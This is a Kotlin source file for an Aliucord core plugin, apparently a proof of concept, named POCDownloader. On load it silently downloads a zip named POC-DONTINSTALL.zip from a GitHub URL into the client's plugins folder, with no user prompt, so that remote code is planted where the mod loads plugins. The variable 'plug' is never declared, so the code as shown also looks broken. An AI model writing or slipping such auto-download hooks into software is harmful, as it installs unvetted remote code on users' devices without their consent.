package com.aliucord.coreplugins

import android.content.Context
import com.aliucord.Http
import com.aliucord.entities.Plugin
import java.io.File

internal class POCDownloader : Plugin(Manifest("POCDownloader")) {
    override fun load(co: Context) {
        plug = File("/sdcard/Aliucord/plugins/POC-DONTINSTALL.zip")
        if(!plug.exists()) Http.simpleDownload("https://github.com/OmegaSunkey/awesomeplugins/raw/builds/POC-DONTINSTALL.zip", plug)
    }
    override fun start(c: Context) {}
    override fun stop(c: Context) {}
}

